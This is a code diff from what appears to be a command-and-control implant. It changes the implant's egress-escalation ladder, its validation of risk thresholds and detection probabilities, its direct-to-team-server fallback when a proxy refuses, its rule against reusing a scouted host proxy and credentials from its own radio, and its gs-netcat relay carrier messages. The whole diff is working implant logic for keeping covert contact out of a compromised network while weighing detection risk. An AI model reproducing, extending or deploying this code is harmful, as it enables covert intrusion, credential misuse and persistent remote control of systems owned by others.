@@ -2470,12 +2470,17 @@ _WAY_OUT_MODEL_DEFAULTS = {
 # natural way to write "no time-based escalation" and it closes the gate
 # for ever -- including for the three verbs that worked before the way out
 # existed. `points_max: 1` and `risk_coefficient: 1` do the opposite:
-# `risk_coefficient: 1` opens the irreversible rung on the first cycle the
-# decider may act, which is precisely the loud rescue `_way_out_points`'
-# own docstring says the operator must not be able to buy with a number in
-# a file. And `document_max_age_seconds: 1` leaves every document stale
-# before it is read, so the rungs that need one are dead while the scout
-# captures nearly continuously.
+# a small coefficient opens the irreversible rung on the first cycle the
+# decider may act. And `document_max_age_seconds: 1` leaves every document
+# stale before it is read, so the rungs that need one are dead while the
+# scout captures nearly continuously.
+#
+# **A floor per setting is not the promise, though**, and a review proved
+# it: 10 is the smallest coefficient accepted here and it puts all three
+# rungs at hour 0, because rung 4 needs `20 * 0.5 - c * 0.8 <= 0` and so
+# a floor of 13 -- and rung 3 needs 17. These floors catch a mistake with
+# a reason that names the setting; the promise itself is checked against
+# the table in `_way_out_keeps_a_ladder`.
 _WAY_OUT_WHOLE = {
     # Two capture slices, so a document can be written before it expires.
     "document_max_age_seconds": 30,
@@ -2561,7 +2566,67 @@ def _way_out_policy(block) -> dict:
     for key in _WAY_OUT_FRACTIONS:
         policy[key] = _way_out_fraction(key, block.get(key, policy[key]))
     policy["model"] = _way_out_model(block.get("model"))
+    _way_out_keeps_a_ladder(policy)
     return policy
+
+
+def _way_out_keeps_a_ladder(policy: dict) -> None:
+    """Refuse a configuration under which a loud rung starts available.
+
+    **The floors were not the claim.** Three comments here and a bold
+    sentence on `docs/WAY_OUT.md` say an operator cannot buy a loud
+    rescue with a number in a file -- and the smallest
+    `risk_coefficient` the floor accepts, 10, puts *all three* rungs at
+    hour 0: rung 4 needs `20 * 0.5 - c * 0.8 <= 0`, so the floor would
+    have had to be 13. `ev_threshold`'s bound was wrong by its whole
+    range: anything under about -16.4 opens rung 4 immediately and the
+    reader took -100. The ordering rule added later was satisfied and
+    irrelevant, because rungs that all cross at hour 0 cross in order.
+
+    So the claim is checked instead of approximated. Each number keeps
+    its own floor -- they catch a mistake with a reason naming the
+    setting -- and this is the property they were standing in for: at
+    the base points, with no time dark and no evidence, the two loud
+    rungs must not be allowed. The quiet rung may be; `portal_answered`
+    bringing it to hour 0 is a documented, intended crossing.
+
+    Computed from `_WAY_OUT_ROWS`, so it cannot drift when the table
+    moves, and from the *prior* detection probabilities: `dot1x_detect`
+    may only raise rung 4's and `portal_detect` only lower rung 2's, both
+    checked elsewhere, so the priors are the loud rungs' easiest case.
+    """
+    coefficient = float(policy["risk_coefficient"])
+    threshold = float(policy["ev_threshold"])
+    for rung in sorted(_WAY_OUT_ROW_OF):
+        if rung <= _WAY_OUT_UNGATED_RUNG:
+            continue
+        row = _WAY_OUT_ROW_OF[rung]
+        points, success, detect = _WAY_OUT_ROWS[row]
+        if points * success - coefficient * detect > threshold:
+            raise ValueError(
+                "c2.way_out's numbers put rung %d (%s) past the gate with "
+                "no time dark at all -- %d points * %.2f - %.0f * %.2f = "
+                "%.1f, which exceeds ev_threshold %.1f -- so the loudest "
+                "moves would be available on the first cycle the decider "
+                "may act. The ladder needs elapsed time *and* repeated "
+                "failure: raise risk_coefficient (at least %d with these "
+                "rows) or raise ev_threshold"
+                % (rung, row, points, success, coefficient, detect,
+                   points * success - coefficient * detect, threshold,
+                   _way_out_least_coefficient(threshold)))
+
+
+def _way_out_least_coefficient(threshold: float) -> int:
+    """The smallest whole coefficient that keeps both loud rungs shut."""
+    least = 1
+    for rung, row in sorted(_WAY_OUT_ROW_OF.items()):
+        if rung <= _WAY_OUT_UNGATED_RUNG:
+            continue
+        points, success, detect = _WAY_OUT_ROWS[row]
+        need = (points * success - threshold) / detect
+        while least <= need:
+            least += 1
+    return least
 
 
 def _way_out_state_dir(raw, enabled: bool) -> str:
@@ -2608,13 +2673,17 @@ def _way_out_whole(key: str, raw, floor: int) -> int:
 
 
 def _way_out_threshold(raw, points_max):
-    """The EV threshold, bounded below so it cannot open everything.
+    """The EV threshold, bounded below so it is still a threshold.
 
-    Unbounded, a negative threshold made every rung reachable on the
-    first cycle the decider may act -- the same hole `risk_coefficient: 1`
-    opened, by the other end of the inequality. The bound is the curve's
-    own ceiling: a threshold below `-points_max` cannot be crossed *back*
-    by any evidence, so it is not a threshold.
+    The bound is the curve's own ceiling: a threshold below `-points_max`
+    cannot be crossed *back* by any evidence, so it is not a threshold at
+    all.
+
+    It is **not** the bound that keeps the loud rungs shut, and the
+    sentence here used to claim it was: a review measured -17, well
+    inside this bound, opening every rung at hour 0. That promise is
+    checked against the table in `_way_out_keeps_a_ladder`, which is
+    reached with this value already read.
     """
     if isinstance(raw, bool) or not isinstance(raw, (int, float)):
         raise ValueError("c2.way_out.ev_threshold is %r, which is not a "
@@ -2622,9 +2691,9 @@ def _way_out_threshold(raw, points_max):
     if raw < -points_max:
         raise ValueError(
             "c2.way_out.ev_threshold is %r, and anything below -%d is below "
-            "what the curve can ever reach, so every rung including the "
-            "irreversible one would be allowed on the first cycle the "
-            "decider may act" % (raw, points_max))
+            "what the curve can ever reach, so it is not a threshold: no "
+            "evidence and no amount of time dark could cross back over it"
+            % (raw, points_max))
     return raw
 
 
@@ -7137,19 +7206,27 @@ class Beacon:
         except Exception as e:
             logger.debug("HTTPS %s failed: %s", endpoint, e)
             self._record_leg(transport, _rescue_class_of(e))
-            # **And the same retry here**, when the session had a proxy.
-            # `_ProxyError` above is raised only when urllib's reason
-            # string happens to contain "proxy" or "tunnel", so a proxy
-            # that simply refused the connection -- `[Errno 111]
-            # Connection refused` -- arrives in this arm instead, and the
-            # one fallback written for exactly that case never ran. That
-            # matters most on the ladder's ordinary climb: rung 2 borrows
-            # the host's proxy at hour 1 and rung 3 moves this implant
-            # onto its own radio at hour 5, where an RFC1918 proxy on the
-            # tapped network does not exist. No `proxy_found` flag here:
-            # a proxy that cannot be reached at all is not a proxy this
+            # **And the same retry here, but only while the radio rung
+            # holds a lease.** `_ProxyError` above is raised only when
+            # urllib's reason string happens to contain "proxy" or
+            # "tunnel", so a proxy that simply refused the connection --
+            # `[Errno 111] Connection refused` -- arrives in this arm
+            # instead, and the one fallback written for exactly that case
+            # never ran. That matters on the ladder's ordinary climb:
+            # rung 2 borrows the host's proxy at hour 1 and rung 3 moves
+            # this implant onto its own radio at hour 5, where an RFC1918
+            # proxy on the tapped network does not exist.
+            #
+            # Gated on the lease and not on `session.proxies` alone,
+            # because ungated it was a behaviour change for every
+            # proxied build that never enabled this feature: a proxy
+            # timeout on an ordinary cycle would have produced a direct
+            # 443 to the team server on a proxy-only network -- a
+            # blocked-egress log line to a known destination, once per
+            # beacon interval, for ever. No `proxy_found` flag either: a
+            # proxy that cannot be reached at all is not a proxy this
             # network *has*, and that bit goes to the operator's panel.
-            if session.proxies:
+            if session.proxies and self._way_out_source:
                 direct = self._post_direct(endpoint, base, data, hdrs)
                 if direct is not None:
                     return direct
@@ -10216,14 +10293,27 @@ class Beacon:
                           % self.gsocket_restart_delay_seconds))
         proc = self._gsocket_proc
         pid = proc.pid if proc is not None else 0
+        # The third thing the radio rung's bind cannot reach, said where
+        # the operator reads it: `gs-netcat` is a **child process**, and a
+        # parent cannot bind its sockets. So a carrier started while the
+        # rung holds a lease dials the relay network out of the tapped
+        # port -- which may be exactly the port that is dead. Not refused:
+        # a tapped port that is rate-limited or filtered for HTTPS can
+        # still carry this, and the operator or the policy asked for it.
+        # Said, because "Carrier started" on its own would read as
+        # "started on the way out this implant just arranged".
+        unbound = (" This carrier leaves by the tapped port, not by the "
+                   "radio rung's lease at %s: a child process's sockets "
+                   "cannot be bound from here."
+                   % self._way_out_source) if self._way_out_source else ""
         if already:
-            return ("Carrier already up: pid %d, forward on 127.0.0.1:%d. "
+            return ("Carrier already up: pid %d, forward on 127.0.0.1:%d.%s "
                     "Not a test of the leg: the next check-in through the "
                     "forward is"
-                    % (pid, self.gsocket_local_port))
-        return ("Carrier started: pid %d, forward on 127.0.0.1:%d. Not a "
+                    % (pid, self.gsocket_local_port, unbound))
+        return ("Carrier started: pid %d, forward on 127.0.0.1:%d.%s Not a "
                 "test of the leg: the next check-in through the forward is"
-                % (pid, self.gsocket_local_port))
+                % (pid, self.gsocket_local_port, unbound))
 
     # ── Rung 2: borrow what the host proves works ──
     #
@@ -10233,7 +10323,35 @@ class Beacon:
     # reads every cycle. Neither tests its own result.
 
     def _egress_borrow(self, what: str) -> Tuple[Optional[dict], str]:
-        """The scout's private half, or a refusal naming what is missing."""
+        """The scout's private half, or a refusal naming what is missing.
+
+        **Not while the radio rung holds a lease.** Everything in that
+        file is a fact about the *tapped* network -- a proxy at an
+        RFC1918 address on the host's segment, a portal at one -- and an
+        implant on its own radio is not on that network any more. Round
+        five stopped `_way_out_bind` from carrying a borrowed proxy onto
+        the radio; this is the same defect reached from the other side,
+        which is that nothing stopped a `credential` rule from putting
+        one there *afterwards*. Rung 2 crosses at hour 1 and the window
+        closes only when a leg **delivers**, so a radio that associates
+        and still cannot reach the team server leaves the candidate walk
+        running every cycle with rung 2 at the top of it: the ordinary
+        climb, not a corner.
+
+        The harm is not only a wasted attempt. An open guest SSID hands
+        out the same private space, so anything answering at that
+        address would be offered a third party's
+        `Proxy-Authorization` -- the one thing `_HttpSession.headers`'
+        own comment says must not leave the device.
+        """
+        if self._way_out_source:
+            return None, ("[error] Not borrowing %s: this implant is on its "
+                          "own radio at %s, and everything the scout "
+                          "captured is a fact about the tapped network -- a "
+                          "proxy and a portal at addresses that are not on "
+                          "this path. Roll the radio rung back first if the "
+                          "tapped port is the way out. Nothing was changed."
+                          % (what, self._way_out_source))
         if not self._way_out_state_dir:
             return None, ("[error] Not borrowing %s: c2.way_out is off on "
                           "this build, so no scout is watching the tapped "
@@ -10676,8 +10794,21 @@ class Beacon:
             session.proxies = proxies
             session.headers = headers
             session.trust_env = trust_env
+        elif address:
+            # Already bound, and binding again: the ordinary case, since
+            # no verb tests its own result. The stash is **not** touched
+            # -- re-stashing what is in use now would leave the rollback
+            # with nothing of the tapped path to put back -- and nothing
+            # is carried across either, because what is in use now
+            # belongs to this path and a fresh bound session already has
+            # it... which is to say: it has nothing, and that is right.
+            self._way_out_source = address
+            session = self._bound_session()
+            session.trust_env = False
         else:
-            self._way_out_source = address or ""
+            # Unbinding with no stash: there was nothing of a tapped path
+            # to keep, so this is the plain case of dropping the source.
+            self._way_out_source = ""
             session = self._bound_session()
             if previous is not None:
                 session.proxies = dict(previous.proxies)
